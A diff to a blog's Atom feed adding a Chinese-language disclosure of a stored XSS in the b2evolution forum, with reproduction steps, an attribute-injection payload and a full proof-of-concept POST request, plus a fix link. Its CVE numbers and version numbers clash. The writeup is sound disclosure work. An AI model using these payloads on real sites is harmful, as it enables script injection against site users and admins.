@@ -4,13 +4,82 @@
  <title>储藏间</title>
  <link href="http://localhost:4000/atom.xml" rel="self"/>
  <link href="http://localhost:4000/"/>
- <updated>2016-12-28T15:10:46+08:00</updated>
+ <updated>2016-12-29T15:13:40+08:00</updated>
  <id>http://localhost:4000</id>
  <author>
    <name>kevinoclam</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>B2evolution v6.4.7 forum XSS [CVE-2016-6821]</title>
+   <link href="http://localhost:4000/2016/12/29/b2evolution-xss-2/"/>
+   <updated>2016-12-29T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/29/b2evolution-xss-2</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: b2evolution.net&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;
+
+&lt;p&gt;CVE-ID：CVE-2016-7149&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;B2evolutioes stored XSS in b2evolution version 6.7.5&lt;/p&gt;
+
+&lt;p&gt;Any user can post a forum with some evil code in it.&lt;/p&gt;
+
+&lt;p&gt;And when the admin see the forum, the page is lack of filter to protect the admin.&lt;/p&gt;
+
+&lt;p&gt;Step 1 : Register a user of the web-site, active the user by mail.&lt;/p&gt;
+
+&lt;p&gt;Step 2 : Post a forum with some thing like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+[test_forum_xss](http://test.forum.xss&quot;onmouseover=&quot;alert(1)&quot;on=&quot;1 &quot;test_forum_xss&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Step 3 : Save the changes&lt;/p&gt;
+
+&lt;p&gt;Step 4 : Any user view the forum, when the mouse over the content, the XSS code runs.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+POST /b2evolution/htsrv/item_edit.php HTTP/1.1
+Host: 192.168.204.130
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.130/b2evolution/index.php/forums/?disp=edit&amp;amp;cat=17
+Cookie: session_b2evo_192_168_204_130=41_UqjtnJWp3oJZWVMtpznHzh4zgKxvBvTR; session_b2evo=87_j6i55FblKwr7rWFbheuTwjRaLbiN6ghM
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 636
+
+post_title=test_forum_xss&amp;amp;content=%5Btest_forum_xss%5D%28http%3A%2F%2Ftest.forum.xss%22onmouseover%3D%22alert%281%29%22on%3D%221+%22test_forum_xss%22%29%0D%0A&amp;amp;renderers_displayed=1&amp;amp;renderers%5B%5D=b2evMark&amp;amp;renderers%5B%5D=b2evWiLi&amp;amp;renderers%5B%5D=b2evGMco&amp;amp;renderers%5B%5D=b2evALnk&amp;amp;renderers%5B%5D=evo_videoplug&amp;amp;renderers%5B%5D=b2WPAutP&amp;amp;post_category=17&amp;amp;post_extracats%5B%5D=17&amp;amp;actionArray%5Bcreate%5D=&amp;amp;crumb_item=IT6Hs70o5KE9J0kgz9nmWNnAhCfW4qeo&amp;amp;ctrl=items&amp;amp;blog=5&amp;amp;post_ID=0&amp;amp;redirect_to=http%3A%2F%2F192.168.204.130%2Fb2evolution%2Findex.php%2Fforums%2F%3Fdisp%3Dedit&amp;amp;preview=0&amp;amp;more=1&amp;amp;preview_userid=8&amp;amp;item_typ_ID=6&amp;amp;post_status=community
+edited_user_login=kevino&amp;amp;edited_user_firstname=kevino&amp;amp;edited_user_lastname=kevino&amp;amp;edited_user_nickname=kevino&amp;amp;edited_user_gender=M&amp;amp;edited_user_ctry_ID=&amp;amp;edited_user_rgn_ID=&amp;amp;edited_user_subrg_ID=&amp;amp;edited_user_city_ID=&amp;amp;edited_user_age_min=&amp;amp;edited_user_age_max=&amp;amp;organizations%5B%5D=&amp;amp;uf_38=kevino&amp;amp;uf_39=kevino&amp;amp;uf_40=kevino&amp;amp;uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&amp;amp;uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&amp;amp;uf_43=http%3A%2F%2Fkevino.net%2Fkevino&amp;amp;new_field_type=3&amp;amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;amp;crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&amp;amp;user_tab=profile&amp;amp;identity_form=1&amp;amp;user_ID=8&amp;amp;blog=1&amp;amp;orig_user_ID=8&amp;amp;12_3=4_56
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/b2evolution/b2evolution/commit/9a4ab85439d1b838ee7b8eeebbf59174bb787811&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>B2evolution v6.4.7 XSS [CVE-2016-6821]</title>
